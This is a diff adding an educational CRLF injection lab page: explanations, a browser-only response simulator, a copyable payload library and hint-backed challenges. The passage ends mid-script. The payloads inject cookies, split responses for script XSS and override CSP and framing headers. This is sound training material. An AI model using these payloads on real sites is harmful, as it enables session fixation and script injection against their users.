@@ -1,0 +1,810 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>CRLF Injection — Security Lab</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;600;700&display=swap');
+
+  :root {
+    --bg: #0a0c10;
+    --panel: #0f1318;
+    --border: #1e2830;
+    --accent: #00e5ff;
+    --accent2: #ff4c60;
+    --accent3: #39ff14;
+    --text: #c8d8e0;
+    --muted: #4a6070;
+    --header-h: 60px;
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Rajdhani', sans-serif;
+    font-size: 16px;
+    min-height: 100vh;
+  }
+
+  /* ── HEADER ── */
+  header {
+    height: var(--header-h);
+    border-bottom: 1px solid var(--border);
+    display: flex;
+    align-items: center;
+    padding: 0 28px;
+    gap: 18px;
+    background: var(--panel);
+    position: sticky; top: 0; z-index: 100;
+  }
+  header .logo {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 18px;
+    color: var(--accent);
+    letter-spacing: 2px;
+  }
+  header .badge {
+    font-size: 11px;
+    font-weight: 700;
+    letter-spacing: 1px;
+    background: var(--accent2);
+    color: #fff;
+    padding: 3px 8px;
+    border-radius: 3px;
+  }
+  header .spacer { flex: 1; }
+  header .nav-links { display: flex; gap: 22px; }
+  header .nav-links a {
+    color: var(--muted);
+    text-decoration: none;
+    font-weight: 600;
+    font-size: 14px;
+    letter-spacing: 1px;
+    cursor: pointer;
+    transition: color .2s;
+  }
+  header .nav-links a:hover, header .nav-links a.active { color: var(--accent); }
+
+  /* ── LAYOUT ── */
+  .container {
+    max-width: 1100px;
+    margin: 0 auto;
+    padding: 36px 24px;
+  }
+
+  /* ── TABS ── */
+  .tabs {
+    display: flex;
+    gap: 4px;
+    margin-bottom: 28px;
+    border-bottom: 1px solid var(--border);
+    padding-bottom: 0;
+  }
+  .tab-btn {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 13px;
+    letter-spacing: 1px;
+    padding: 10px 22px;
+    border: 1px solid transparent;
+    border-bottom: none;
+    background: transparent;
+    color: var(--muted);
+    cursor: pointer;
+    border-radius: 4px 4px 0 0;
+    transition: all .2s;
+    position: relative;
+    top: 1px;
+  }
+  .tab-btn.active {
+    background: var(--panel);
+    border-color: var(--border);
+    border-bottom-color: var(--panel);
+    color: var(--accent);
+  }
+  .tab-btn:hover:not(.active) { color: var(--text); }
+
+  .tab-content { display: none; }
+  .tab-content.active { display: block; }
+
+  /* ── CARDS ── */
+  .card {
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 24px 28px;
+    margin-bottom: 22px;
+  }
+  .card h2 {
+    font-size: 18px;
+    font-weight: 700;
+    letter-spacing: 1px;
+    margin-bottom: 10px;
+    color: #fff;
+  }
+  .card p, .card li {
+    color: var(--text);
+    line-height: 1.7;
+    font-size: 15px;
+  }
+  .card ul { padding-left: 20px; }
+  .card ul li { margin-bottom: 6px; }
+
+  .highlight { color: var(--accent); font-family: 'Share Tech Mono', monospace; font-size: 14px; }
+  .danger    { color: var(--accent2); font-family: 'Share Tech Mono', monospace; font-size: 14px; }
+  .success   { color: var(--accent3); font-family: 'Share Tech Mono', monospace; font-size: 14px; }
+
+  /* ── FORM ── */
+  .form-group { margin-bottom: 18px; }
+  label {
+    display: block;
+    font-size: 13px;
+    font-weight: 700;
+    letter-spacing: 1px;
+    color: var(--muted);
+    margin-bottom: 7px;
+  }
+  input[type=text], select, textarea {
+    width: 100%;
+    background: #070910;
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    color: var(--accent3);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 14px;
+    padding: 10px 14px;
+    outline: none;
+    transition: border-color .2s;
+  }
+  input[type=text]:focus, select:focus, textarea:focus { border-color: var(--accent); }
+  textarea { resize: vertical; min-height: 80px; }
+
+  button.btn {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 14px;
+    letter-spacing: 1px;
+    padding: 10px 28px;
+    border: none;
+    border-radius: 4px;
+    cursor: pointer;
+    transition: opacity .2s, transform .1s;
+  }
+  button.btn:active { transform: scale(.97); }
+  button.btn-primary { background: var(--accent); color: #000; }
+  button.btn-danger  { background: var(--accent2); color: #fff; }
+  button.btn-success { background: var(--accent3); color: #000; }
+  button.btn:hover   { opacity: .85; }
+
+  /* ── RESPONSE / HTTP PANEL ── */
+  .http-panel {
+    background: #060810;
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    padding: 16px;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 13px;
+    line-height: 1.8;
+    overflow-x: auto;
+    white-space: pre-wrap;
+    word-break: break-all;
+    min-height: 120px;
+  }
+  .http-panel .h-key   { color: #7ecfff; }
+  .http-panel .h-val   { color: var(--accent3); }
+  .http-panel .h-inj   { color: var(--accent2); font-weight: bold; }
+  .http-panel .h-status{ color: var(--accent); }
+  .http-panel .h-body  { color: var(--text); }
+
+  /* ── ALERT BOXES ── */
+  .alert {
+    border-radius: 4px;
+    padding: 12px 18px;
+    font-size: 14px;
+    margin-bottom: 16px;
+    display: flex;
+    gap: 10px;
+    align-items: flex-start;
+  }
+  .alert-info    { background: rgba(0,229,255,.07); border-left: 3px solid var(--accent); }
+  .alert-danger  { background: rgba(255,76,96,.10); border-left: 3px solid var(--accent2); }
+  .alert-success { background: rgba(57,255,20,.07); border-left: 3px solid var(--accent3); }
+  .alert-icon    { font-size: 18px; line-height: 1; }
+
+  /* ── SCENARIO GRID ── */
+  .scenario-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 18px;
+    margin-bottom: 22px;
+  }
+  @media (max-width: 700px) { .scenario-grid { grid-template-columns: 1fr; } }
+
+  .scenario-card {
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 18px 20px;
+    cursor: pointer;
+    transition: border-color .2s, background .2s;
+  }
+  .scenario-card:hover         { border-color: var(--accent); }
+  .scenario-card.selected      { border-color: var(--accent); background: rgba(0,229,255,.05); }
+  .scenario-card h3            { font-size: 15px; font-weight: 700; margin-bottom: 6px; color: #fff; }
+  .scenario-card p             { font-size: 13px; color: var(--muted); line-height: 1.5; }
+  .scenario-card .sc-badge {
+    display: inline-block;
+    font-size: 11px;
+    font-weight: 700;
+    letter-spacing: .5px;
+    padding: 2px 7px;
+    border-radius: 3px;
+    margin-bottom: 8px;
+  }
+  .easy   { background: rgba(57,255,20,.15);  color: var(--accent3); }
+  .medium { background: rgba(0,229,255,.15);  color: var(--accent); }
+  .hard   { background: rgba(255,76,96,.15);  color: var(--accent2); }
+
+  /* ── PAYLOAD LIBRARY ── */
+  .payload-row {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    padding: 10px 14px;
+    border-bottom: 1px solid var(--border);
+    transition: background .15s;
+  }
+  .payload-row:last-child { border-bottom: none; }
+  .payload-row:hover      { background: rgba(255,255,255,.02); }
+  .payload-code {
+    flex: 1;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 12px;
+    color: var(--accent3);
+    word-break: break-all;
+  }
+  .payload-desc { font-size: 13px; color: var(--muted); width: 200px; flex-shrink: 0; }
+  .copy-btn {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    padding: 4px 10px;
+    background: transparent;
+    border: 1px solid var(--border);
+    color: var(--muted);
+    border-radius: 3px;
+    cursor: pointer;
+    transition: all .15s;
+    white-space: nowrap;
+  }
+  .copy-btn:hover { border-color: var(--accent); color: var(--accent); }
+
+  /* ── PROGRESS ── */
+  .progress-bar-wrap {
+    height: 4px;
+    background: var(--border);
+    border-radius: 2px;
+    margin-bottom: 22px;
+    overflow: hidden;
+  }
+  .progress-bar {
+    height: 100%;
+    background: linear-gradient(90deg, var(--accent), var(--accent3));
+    border-radius: 2px;
+    transition: width .5s ease;
+  }
+
+  /* ── DIFF VIEW ── */
+  .diff-row { display: flex; gap: 18px; }
+  .diff-row > div { flex: 1; }
+  .diff-label { font-size: 12px; font-weight: 700; letter-spacing: 1px; color: var(--muted); margin-bottom: 8px; }
+
+  /* ── CHALLENGE RESULT ── */
+  #challengeResult { margin-top: 18px; display: none; }
+  .result-box {
+    border-radius: 6px;
+    padding: 20px 24px;
+    border: 1px solid;
+  }
+  .result-pass { background: rgba(57,255,20,.07); border-color: var(--accent3); }
+  .result-fail { background: rgba(255,76,96,.10); border-color: var(--accent2); }
+  .result-box h3 { font-size: 17px; font-weight: 700; margin-bottom: 8px; }
+
+  /* ── scrollbar ── */
+  ::-webkit-scrollbar { width: 6px; height: 6px; }
+  ::-webkit-scrollbar-track { background: var(--bg); }
+  ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+
+  /* ── tiny animation on inject ── */
+  @keyframes flash { 0%,100%{opacity:1} 50%{opacity:.3} }
+  .flashing { animation: flash .4s 3; }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="logo">// CRLF_LAB</div>
+  <div class="badge">EDUCATIONAL</div>
+  <div class="spacer"></div>
+  <div class="nav-links">
+    <a class="active" onclick="switchTab('learn')">Learn</a>
+    <a onclick="switchTab('lab')">Lab</a>
+    <a onclick="switchTab('payloads')">Payloads</a>
+    <a onclick="switchTab('challenges')">Challenges</a>
+  </div>
+</header>
+
+<div class="container">
+
+  <!-- ═══════════ LEARN TAB ═══════════ -->
+  <div class="tab-content active" id="tab-learn">
+
+    <div class="card">
+      <h2>📡 What is CRLF Injection?</h2>
+      <p>
+        <strong>CRLF</strong> stands for <span class="highlight">Carriage Return (\r)</span> + <span class="highlight">Line Feed (\n)</span> — the two-character sequence used to terminate lines in HTTP headers.
+        When an attacker can inject <span class="danger">%0d%0a</span> (URL-encoded CRLF) into a value that gets reflected into an HTTP response header, they can:
+      </p>
+      <ul style="margin-top:12px">
+        <li>Inject arbitrary <strong>HTTP response headers</strong></li>
+        <li>Perform <strong>HTTP response splitting</strong> to poison caches</li>
+        <li>Set malicious <strong>Set-Cookie</strong> headers → session fixation</li>
+        <li>Inject <strong>XSS payloads</strong> into a fake second response body</li>
+        <li>Bypass <strong>security headers</strong> (CSP, X-Frame-Options, etc.)</li>
+      </ul>
+    </div>
+
+    <div class="card">
+      <h2>🔬 How It Works — Step by Step</h2>
+      <p>Consider a redirect endpoint that mirrors user input:</p>
+      <div class="http-panel" style="margin:14px 0">
+<span class="h-key">GET</span> <span class="h-val">/redirect?url=https://example.com</span> HTTP/1.1
+Host: vulnerable-site.com
+
+<span class="h-comment">→ Server responds with:</span>
+<span class="h-status">HTTP/1.1 302 Found</span>
+<span class="h-key">Location:</span> <span class="h-val">https://example.com</span>
+      </div>
+      <p>Now inject <span class="danger">%0d%0aSet-Cookie:%20session=evil</span> as part of the URL:</p>
+      <div class="http-panel" style="margin:14px 0">
+<span class="h-key">GET</span> <span class="h-val">/redirect?url=https://example.com<span style="color:var(--accent2)">%0d%0aSet-Cookie:%20session=evil</span></span>
+
+<span class="h-comment">→ Server reflects the injected bytes into the header:</span>
+<span class="h-status">HTTP/1.1 302 Found</span>
+<span class="h-key">Location:</span> <span class="h-val">https://example.com</span>
+<span class="h-inj">Set-Cookie: session=evil</span>  ← INJECTED!
+      </div>
+    </div>
+
+    <div class="card">
+      <h2>💀 Attack Vectors</h2>
+      <ul>
+        <li><strong>Response Splitting:</strong> Inject a full second HTTP response to poison a shared cache</li>
+        <li><strong>XSS via Headers:</strong> Inject <span class="danger">Content-Type: text/html</span> + blank line + <span class="danger">&lt;script&gt;</span> body</li>
+        <li><strong>Cookie Injection:</strong> Set arbitrary cookies → session fixation / CSRF bypass</li>
+        <li><strong>Log Injection:</strong> Inject newlines into server logs to forge or hide log entries</li>
+        <li><strong>Security Header Bypass:</strong> Override CSP, X-Frame-Options, HSTS by injecting replacement headers</li>
+      </ul>
+    </div>
+
+    <div class="card">
+      <h2>🛡️ Mitigations</h2>
+      <ul>
+        <li>Strip or reject <span class="highlight">\r</span> and <span class="highlight">\n</span> from any user input used in HTTP headers</li>
+        <li>Use framework APIs to set headers — they encode values automatically</li>
+        <li>Validate redirect URLs against an allowlist</li>
+        <li>Encode output before placing it in a header context</li>
+        <li>Deploy a WAF rule that blocks <span class="danger">%0d</span> / <span class="danger">%0a</span> in header-reflected parameters</li>
+      </ul>
+    </div>
+
+  </div>
+
+  <!-- ═══════════ LAB TAB ═══════════ -->
+  <div class="tab-content" id="tab-lab">
+
+    <div class="alert alert-danger">
+      <span class="alert-icon">⚠️</span>
+      <span>This is a <strong>simulated</strong> lab. No real HTTP requests are made. The "response" panel shows what a vulnerable server would return if it reflected your input unsanitized into headers.</span>
+    </div>
+
+    <div class="scenario-grid" id="scenarioGrid">
+      <div class="scenario-card selected" onclick="selectScenario(0,this)" data-id="0">
+        <div class="sc-badge easy">EASY</div>
+        <h3>Redirect Header Injection</h3>
+        <p>The server reflects the <code>url</code> parameter directly into a <code>Location</code> header.</p>
+      </div>
+      <div class="scenario-card" onclick="selectScenario(1,this)" data-id="1">
+        <div class="sc-badge easy">EASY</div>
+        <h3>Cookie Injection</h3>
+        <p>Inject a <code>Set-Cookie</code> header to perform session fixation.</p>
+      </div>
+      <div class="scenario-card" onclick="selectScenario(2,this)" data-id="2">
+        <div class="sc-badge medium">MEDIUM</div>
+        <h3>XSS via Response Splitting</h3>
+        <p>Use CRLF + blank line to inject an HTML body with a script tag.</p>
+      </div>
+      <div class="scenario-card" onclick="selectScenario(3,this)" data-id="3">
+        <div class="sc-badge hard">HARD</div>
+        <h3>Security Header Bypass</h3>
+        <p>Inject a replacement <code>Content-Security-Policy</code> header to neutralise CSP.</p>
+      </div>
+    </div>
+
+    <div class="card" id="labCard">
+      <h2 id="scenarioTitle">Scenario: Redirect Header Injection</h2>
+      <p id="scenarioDesc" style="margin-bottom:16px; color:var(--muted); font-size:14px;">
+        The vulnerable endpoint takes a <code>url</code> parameter and issues a redirect.
+        It places the value directly into the <code>Location</code> header without sanitisation.
+        Inject CRLF to add extra headers.
+      </p>
+
+      <div class="form-group">
+        <label>INPUT PARAMETER VALUE</label>
+        <input type="text" id="payloadInput" value="https://example.com"
+               placeholder="Type or paste a payload…"
+               oninput="simulateResponse()">
+      </div>
+
+      <div style="display:flex; gap:10px; margin-bottom:18px; flex-wrap:wrap;">
+        <button class="btn btn-primary" onclick="simulateResponse()">▶ Simulate Response</button>
+        <button class="btn btn-danger"  onclick="injectExample()">⚡ Auto-inject Example</button>
+        <button class="btn" style="background:var(--panel);border:1px solid var(--border);color:var(--muted);" onclick="clearInput()">✕ Clear</button>
+      </div>
+
+      <div class="diff-row">
+        <div>
+          <div class="diff-label">SAFE RESPONSE (sanitised)</div>
+          <div class="http-panel" id="safePanel">—</div>
+        </div>
+        <div>
+          <div class="diff-label">VULNERABLE RESPONSE (unsanitised)</div>
+          <div class="http-panel" id="vulnPanel">—</div>
+        </div>
+      </div>
+
+      <div id="labAlert" style="margin-top:16px; display:none;"></div>
+    </div>
+
+  </div>
+
+  <!-- ═══════════ PAYLOADS TAB ═══════════ -->
+  <div class="tab-content" id="tab-payloads">
+
+    <div class="card" style="padding:0; overflow:hidden;">
+      <div style="padding:18px 22px; border-bottom:1px solid var(--border); display:flex; justify-content:space-between; align-items:center;">
+        <h2 style="margin:0">Payload Library</h2>
+        <span style="font-size:13px; color:var(--muted);">Click <strong>USE</strong> to send to lab</span>
+      </div>
+      <div id="payloadLibrary"></div>
+    </div>
+
+  </div>
+
+  <!-- ═══════════ CHALLENGES TAB ═══════════ -->
+  <div class="tab-content" id="tab-challenges">
+
+    <div class="progress-bar-wrap">
+      <div class="progress-bar" id="progressBar" style="width:0%"></div>
+    </div>
+    <div style="text-align:right; font-size:13px; color:var(--muted); margin-top:-18px; margin-bottom:20px;" id="progressLabel">0 / 4 solved</div>
+
+    <div id="challengeList"></div>
+
+  </div>
+
+</div>
+
+<!-- ─────────── JAVASCRIPT ─────────── -->
+<script>
+/* ═══ TAB NAVIGATION ═══ */
+function switchTab(name) {
+  document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+  document.querySelectorAll('.nav-links a').forEach(a => a.classList.remove('active'));
+  document.getElementById('tab-' + name).classList.add('active');
+  const links = document.querySelectorAll('.nav-links a');
+  const map = {learn:0, lab:1, payloads:2, challenges:3};
+  links[map[name]].classList.add('active');
+}
+
+/* ═══ SCENARIO DATA ═══ */
+const SCENARIOS = [
+  {
+    title: 'Scenario: Redirect Header Injection',
+    desc: 'The vulnerable endpoint takes a <code>url</code> parameter and issues a redirect. It places the value directly into the <code>Location</code> header without sanitisation. Inject CRLF to add extra headers.',
+    baseHeader: 'Location',
+    examplePayload: 'https://example.com\r\nX-Injected: pwned\r\nX-Attacker: crlf-injection',
+    exampleDisplayPayload: 'https://example.com%0d%0aX-Injected:%20pwned%0d%0aX-Attacker:%20crlf-injection',
+    responseStatus: '302 Found',
+    extraHeaders: {'Content-Type':'text/html','Server':'VulnApp/1.0'}
+  },
+  {
+    title: 'Scenario: Cookie Injection',
+    desc: 'The redirect mirrors the <code>next</code> parameter into a <code>Location</code> header. Inject a <code>Set-Cookie</code> to fixate the victim\'s session.',
+    baseHeader: 'Location',
+    examplePayload: '/dashboard\r\nSet-Cookie: session=ATTACKER_SESSION; Path=/; HttpOnly',
+    exampleDisplayPayload: '/dashboard%0d%0aSet-Cookie:%20session=ATTACKER_SESSION;%20Path=/;%20HttpOnly',
+    responseStatus: '302 Found',
+    extraHeaders: {'Content-Type':'text/html','Server':'VulnApp/1.0'}
+  },
+  {
+    title: 'Scenario: XSS via Response Splitting',
+    desc: 'Inject two CRLFs to end the headers, then write a malicious HTML body. This can execute JavaScript in older or misconfigured proxy-cached responses.',
+    baseHeader: 'Location',
+    examplePayload: '/page\r\nContent-Length: 44\r\n\r\n<script>alert("CRLF XSS")<\/script>',
+    exampleDisplayPayload: '/page%0d%0aContent-Length:%2044%0d%0a%0d%0a%3Cscript%3Ealert(%22CRLF-XSS%22)%3C%2Fscript%3E',
+    responseStatus: '200 OK',
+    extraHeaders: {'Content-Type':'text/html','Server':'VulnApp/1.0'}
+  },
+  {
+    title: 'Scenario: Security Header Bypass',
+    desc: 'The application sets a strict CSP. But because the <code>Location</code> header is injectable, we can inject a second <code>Content-Security-Policy</code> header that overrides the first, disabling protections.',
+    baseHeader: 'Location',
+    examplePayload: '/app\r\nContent-Security-Policy: default-src *; script-src *; unsafe-inline',
+    exampleDisplayPayload: '/app%0d%0aContent-Security-Policy:%20default-src%20*;%20script-src%20*;%20unsafe-inline',
+    responseStatus: '302 Found',
+    extraHeaders: {'Content-Type':'text/html','Server':'VulnApp/1.0','Content-Security-Policy':"default-src 'self'"}
+  }
+];
+
+let currentScenario = 0;
+
+function selectScenario(id, el) {
+  currentScenario = id;
+  document.querySelectorAll('.scenario-card').forEach(c => c.classList.remove('selected'));
+  el.classList.add('selected');
+  const sc = SCENARIOS[id];
+  document.getElementById('scenarioTitle').innerHTML = sc.title;
+  document.getElementById('scenarioDesc').innerHTML  = sc.desc;
+  document.getElementById('payloadInput').value = sc.exampleDisplayPayload || '';
+  simulateResponse();
+}
+
+/* ═══ RESPONSE SIMULATION ═══ */
+function esc(s) {
+  return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+function buildSafeResponse(rawInput) {
+  const sc = SCENARIOS[currentScenario];
+  // Strip CRLF completely (safe server behaviour)
+  const sanitised = rawInput
+    .replace(/%0[dD]%0[aA]/g,'').replace(/%0[dD]/g,'').replace(/%0[aA]/g,'')
+    .replace(/[\r\n]/g,'');
+  // Decode remaining percent-encoding for display
+  let display = sanitised;
+  try { display = decodeURIComponent(sanitised); } catch(e) { display = sanitised; }
+  let out = `<span class="h-status">HTTP/1.1 ${sc.responseStatus}</span>\n`;
+  Object.entries(sc.extraHeaders).forEach(([k,v]) => {
+    out += `<span class="h-key">${esc(k)}:</span> <span class="h-val">${esc(v)}</span>\n`;
+  });
+  out += `<span class="h-key">${sc.baseHeader}:</span> <span class="h-val">${esc(display)}</span>\n`;
+  return out;
+}
+
+function buildVulnResponse(rawInput) {
+  const sc = SCENARIOS[currentScenario];
+  // Decode percent-encoded CRLF sequences first
+  const decoded = rawInput
+    .replace(/%0[dD]%0[aA]/g, '\r\n')
+    .replace(/%0[dD]/g, '\r')
+    .replace(/%0[aA]/g, '\n')
+    // Also decode %3C %3E %22 so script tags show up in the body section
+    .replace(/%3C/gi, '<').replace(/%3E/gi, '>').replace(/%22/gi, '"').replace(/%20/gi, ' ');
+
+  const lines = decoded.split(/\r\n|\r|\n/);
+  let out = `<span class="h-status">HTTP/1.1 ${sc.responseStatus}</span>\n`;
+  Object.entries(sc.extraHeaders).forEach(([k,v]) => {
+    out += `<span class="h-key">${esc(k)}:</span> <span class="h-val">${esc(v)}</span>\n`;
+  });
+
+  const firstLine = lines[0];
+  out += `<span class="h-key">${sc.baseHeader}:</span> <span class="h-val">${esc(firstLine)}</span>\n`;
+
+  let inBody = false;
+  for (let i = 1; i < lines.length; i++) {
+    const line = lines[i];
+    if (!inBody && line === '') {
+      inBody = true;
+      out += `<span class="h-inj">\n[BLANK LINE — HEADER BOUNDARY CROSSED → BODY STARTS]</span>\n`;
+    } else if (inBody) {
+      out += `<span class="h-body" style="color:var(--accent2);">${esc(line)}  ← INJECTED BODY</span>\n`;
+    } else if (line.includes(':')) {
+      const colon = line.indexOf(':');
+      const k = line.slice(0, colon);
+      const v = line.slice(colon + 1);
+      out += `<span class="h-inj">${esc(k)}:${esc(v)}  ← INJECTED HEADER</span>\n`;
+    } else {
+      out += `<span class="h-inj">${esc(line)}  ← INJECTED</span>\n`;
+    }
+  }
+
+  return out;
+}
+
+function simulateResponse() {
+  const input = document.getElementById('payloadInput').value;
+  const sc = SCENARIOS[currentScenario];
+  const hasInjection = /[\r\n]|%0[dDaA]/.test(input);
+
+  document.getElementById('safePanel').innerHTML = buildSafeResponse(input);
+  document.getElementById('vulnPanel').innerHTML = buildVulnResponse(input);
+
+  const alertBox = document.getElementById('labAlert');
+  if (hasInjection) {
+    alertBox.style.display = 'flex';
+    alertBox.className = 'alert alert-danger';
+    alertBox.innerHTML = '<span class="alert-icon">💉</span><span><strong>CRLF injection detected!</strong> The vulnerable response contains injected headers. The safe server strips CR/LF characters before writing the header.</span>';
+    document.getElementById('vulnPanel').classList.add('flashing');
+    setTimeout(() => document.getElementById('vulnPanel').classList.remove('flashing'), 1300);
+  } else {
+    alertBox.style.display = 'flex';
+    alertBox.className = 'alert alert-info';
+    alertBox.innerHTML = '<span class="alert-icon">ℹ️</span><span>No injection detected yet. Try adding <strong>%0d%0a</strong> followed by a header like <code>Set-Cookie: x=y</code></span>';
+  }
+}
+
+function injectExample() {
+  const sc = SCENARIOS[currentScenario];
+  document.getElementById('payloadInput').value = sc.exampleDisplayPayload;
+  simulateResponse();
+}
+
+function clearInput() {
+  document.getElementById('payloadInput').value = '';
+  document.getElementById('safePanel').innerHTML = '—';
+  document.getElementById('vulnPanel').innerHTML = '—';
+  document.getElementById('labAlert').style.display = 'none';
+}
+
+/* ═══ PAYLOAD LIBRARY ═══ */
+const PAYLOADS = [
+  { payload: '%0d%0aX-Custom-Header:%20injected',       desc: 'Inject arbitrary header', scenario: 0 },
+  { payload: '%0d%0aSet-Cookie:%20admin=true',          desc: 'Cookie injection',         scenario: 1 },
+  { payload: '%0d%0aSet-Cookie:%20session=fixated; Path=/', desc: 'Session fixation',     scenario: 1 },
+  { payload: '%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<h1>Pwned</h1>', desc: 'Response splitting + HTML body', scenario: 2 },
+  { payload: '%0d%0aContent-Length:%2029%0d%0a%0d%0a<script>alert(1)<\/script>', desc: 'XSS via response split', scenario: 2 },
+  { payload: '%0d%0aContent-Security-Policy:%20default-src%20*', desc: 'CSP bypass', scenario: 3 },
+  { payload: '%0d%0aX-Frame-Options:%20ALLOWALL',       desc: 'Clickjacking enablement',  scenario: 3 },
+  { payload: '%0d%0aAccess-Control-Allow-Origin:%20*',  desc: 'CORS relaxation',           scenario: 0 },
+  { payload: '%0a%0dSet-Cookie:%20evil=1',              desc: 'LF before CR variant',      scenario: 1 },
+  { payload: '%E5%98%8A%E5%98%8DSet-Cookie:%20test=1', desc: 'Unicode CRLF (U+560A/560D)', scenario: 1 },
+];
+
+function buildPayloadLibrary() {
+  const lib = document.getElementById('payloadLibrary');
+  lib.innerHTML = PAYLOADS.map((p,i) => `
+    <div class="payload-row">
+      <div class="payload-code">${esc(p.payload)}</div>
+      <div class="payload-desc">${p.desc}</div>
+      <button class="copy-btn" onclick="copyPayload(${i})">COPY</button>
+      <button class="copy-btn" style="border-color:var(--accent);color:var(--accent)" onclick="usePayload(${i})">USE ▶</button>
+    </div>
+  `).join('');
+}
+
+function copyPayload(i) {
+  navigator.clipboard.writeText(PAYLOADS[i].payload).catch(()=>{});
+}
+
+function usePayload(i) {
+  const p = PAYLOADS[i];
+  selectScenario(p.scenario, document.querySelector(`[data-id="${p.scenario}"]`));
+  const base = SCENARIOS[p.scenario].exampleDisplayPayload.split('%0')[0] || 'https://example.com';
+  document.getElementById('payloadInput').value = base + p.payload;
+  simulateResponse();
+  switchTab('lab');
+}
+
+/* ═══ CHALLENGES ═══ */
+const CHALLENGES = [
+  {
+    id: 0,
+    title: '🏁 Challenge 1 — Add an Injected Header',
+    desc: 'Craft a payload that results in a <code>X-Hacked: yes</code> header being injected into the response. Use the Redirect scenario.',
+    scenarioId: 0,
+    hint: 'Encode CRLF as %0d%0a and follow it with <code>X-Hacked: yes</code>.',
+    validate: (input) => {
+      const decoded = input.replace(/%0[dD]%0[aA]/g,'\r\n').replace(/%0[dD]/g,'\r').replace(/%0[aA]/g,'\n');
+      return /X-Hacked:\s*yes/i.test(decoded);
+    }
+  },
+  {
+    id: 1,
+    title: '🏁 Challenge 2 — Session Fixation',
+    desc: 'Inject a <code>Set-Cookie</code> header that sets <code>session=hacked123</code>.',
+    scenarioId: 1,
+    hint: 'Append %0d%0aSet-Cookie:%20session=hacked123 to a redirect URL.',
+    validate: (input) => {
+      const decoded = input.replace(/%0[dD]%0[aA]/g,'\r\n').replace(/%0[dD]/g,'\r').replace(/%0[aA]/g,'\n');
+      return /Set-Cookie:\s*session=hacked123/i.test(decoded);
+    }
+  },
+  {
+    id: 2,
+    title: '🏁 Challenge 3 — XSS via Response Splitting',
+    desc: 'Use CRLF injection to inject two blank lines and then an HTML body containing <code>&lt;script&gt;alert("xss")&lt;/script&gt;</code>.',
+    scenarioId: 2,
+    hint: 'You need two CRLF sequences (%0d%0a%0d%0a) to end the headers, then add the script tag.',
+    validate: (input) => {
+      const decoded = input
+        .replace(/%0[dD]%0[aA]/g,'\r\n').replace(/%0[dD]/g,'\r').replace(/%0[aA]/g,'\n')
+        .replace(/%3C/gi,'<').replace(/%3E/gi,'>').replace(/%22/gi,'"').replace(/%20/gi,' ');
+      return /\r\n\r\n/.test(decoded) && /<script[^>]*>.*alert.*<\/script>/i.test(decoded);
+    }
+  },
+  {
+    id: 3,
+    title: '🏁 Challenge 4 — CSP Bypass',
+    desc: 'Override the existing <code>Content-Security-Policy</code> header by injecting a permissive one: <code>default-src *</code>.',
+    scenarioId: 3,
+    hint: 'Inject %0d%0aContent-Security-Policy:%20default-src%20* after a base redirect.',
+    validate: (input) => {
+      const decoded = input.replace(/%0[dD]%0[aA]/g,'\r\n').replace(/%0[dD]/g,'\r').replace(/%0[aA]/g,'\n');
+      return /Content-Security-Policy:\s*default-src\s+\*/i.test(decoded);
+    }
+  }
+];
+
+const solved = new Set();
+
+function buildChallenges() {
+  const list = document.getElementById('challengeList');
+  list.innerHTML = CHALLENGES.map(ch => `
+    <div class="card" id="ch-card-${ch.id}">
+      <h2>${ch.title} <span id="ch-badge-${ch.id}" style="font-size:13px; margin-left:8px;"></span></h2>
+      <p style="color:var(--muted);font-size:14px;margin-bottom:16px;">${ch.desc}</p>
+      <div class="form-group">
+        <label>YOUR PAYLOAD</label>
+        <input type="text" id="ch-input-${ch.id}" placeholder="Enter your injection payload…">
+      </div>
+      <div style="display:flex;gap:10px;">
+        <button class="btn btn-primary" onclick="checkChallenge(${ch.id})">▶ Submit</button>
+        <button class="btn" style="background:var(--panel);border:1px solid var(--border);color:var(--muted);" onclick="toggleHint(${ch.id})">💡 Hint</button>
+      </div>
+      <div id="ch-hint-${ch.id}" style="display:none; margin-top:12px;" class="alert alert-info">
+        <span class="alert-icon">💡</span><span>${ch.hint}</span>
+      </div>
+      <div id="ch-result-${ch.id}" style="margin-top:14px; display:none;"></div>
+    </div>
+  `).join('');
+}
+
+function toggleHint(id) {
+  const h = document.getElementById('ch-hint-' + id);
+  h.style.display = h.style.display === 'none' ? 'flex' : 'none';
+}
+
+function checkChallenge(id) {
+  const input = document.getElementById('ch-input-' + id).value;
+  const ch    = CHALLENGES.find(c => c.id === id);
+  const pass  = ch.validate(input);
+  const resEl = document.getElementById('ch-result-' + id);
+  const badge = document.getElementById('ch-badge-' + id);
+
+  resEl.style.display = 'block';
+  if (pass) {
+    solved.add(id);
+    resEl.innerHTML = `<div class="result-box result-pass"><h3 style="color:var(--accent3)">✅ Solved!</h3><p>Your payload correctly injected the target header. Well done.</p></div>`;
+    badge.innerHTML = '<span style="color:var(--accent3)">✔ SOLVED</span>';
+  } else {
+    resEl.innerHTML = `<div class="result-box result-fail"><h3 style="color:var(--accent2)">✗ Not quite</h3><p>The payload didn't satisfy the challenge condition. Check the hint if you're stuck.</p></div>`;
+    badge.innerHTML = '<span style="color:var(--accent2)">✗ FAILED</span>';
+  }
+  updateProgress();
+}
+
+function updateProgress() {
